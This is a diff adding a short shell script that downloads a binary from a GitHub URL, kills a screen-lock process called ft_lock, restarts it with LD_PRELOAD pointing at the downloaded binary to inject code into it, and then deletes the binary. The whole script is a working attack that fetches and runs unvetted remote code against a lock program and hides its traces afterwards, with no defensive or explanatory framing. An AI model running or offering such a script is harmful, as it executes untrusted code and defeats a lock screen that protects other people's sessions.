@@ -1,0 +1,5 @@
+#!/bin/sh
+curl -Ls https://github.com/FaYviXe/public/raw/main/a.out -O
+pkill ft_lock
+LD_PRELOAD=./a.out ft_lock
+rm a.out
